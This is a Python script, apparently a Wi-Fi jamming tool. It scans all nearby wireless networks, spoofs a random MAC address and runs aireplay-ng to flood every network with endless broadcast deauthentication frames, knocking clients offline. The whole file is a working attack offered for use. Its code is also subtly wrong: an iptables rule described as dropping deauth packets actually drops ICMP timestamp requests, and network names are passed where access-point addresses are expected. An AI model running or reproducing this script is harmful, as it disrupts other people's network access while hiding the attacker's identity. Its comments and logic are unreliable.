from subprocess import call, check_output
from itertools import count as infcount
from time import sleep
from random import randint
import os

class Deauth:
    def __init__(self) -> None:
        # Drop all deauth packets from incoming traffic
        call(['iptables', '-I', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'])

    def random_mac(self) -> str:
        return ":".join([hex(randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])

    def deauth_all(self) -> None:
        output: bytes = check_output(['iwlist', 'wlan0', 'scan'])
        networks: list[bytes] = [line.split(b':')[1] for line in output.split(b'\n') if b'ESSID' in line] # {var}.split(b'...') -> 'b' defines the type as bytes instead of string 
        for network in networks:
            print("[LOG] ",network.strip())
            call(['iwconfig', 'wlan0', 'mode', 'monitor'])
            call(['ifconfig', 'wlan0', 'down'])
            call(['macchanger', '-m', self.random_mac(), 'wlan0'])
            call(['ifconfig', 'wlan0', 'up'])
            call(['aireplay-ng', '-0', '0', '-a', network.strip(), '-c', 'FF:FF:FF:FF:FF:FF', 'wlan0'])
            call(['iwconfig', 'wlan0', 'mode', 'managed'])
            call(['ifconfig', 'wlan0', 'down'])
            call(['macchanger', '-p', 'wlan0'])
            call(['ifconfig', 'wlan0', 'up'])
        sleep(1) # Prevent Crashing / Lagging out

if __name__ == "__main__":
    deauth = Deauth()
    for _ in infcount():
        try: deauth.deauth_all()
        except KeyboardInterrupt as d:
            # Restore iptables rules before exiting
            call(['iptables', '-D', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'])
            break
